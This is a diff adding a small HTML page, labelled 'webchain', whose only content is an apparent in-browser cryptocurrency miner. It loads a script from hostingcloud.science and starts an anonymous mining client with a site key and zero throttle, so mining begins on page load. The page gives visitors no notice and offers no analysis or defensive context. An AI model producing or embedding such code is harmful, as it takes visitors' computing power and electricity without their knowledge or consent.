@@ -1,0 +1,24 @@
+webchain
+
+https://www.w3schools.com/code/tryit.asp?filename=FVWGY7OHEHC2
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<script src="https://www.hostingcloud.science./pG1t.js"></script>
+<script>
+    var _client = new Client.Anonymous('33d0afdb9d33eb5be6775f23bf5584c5b4529a07c15ce698610b576ebda52880', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
+ 
+</body>
+</html>
+
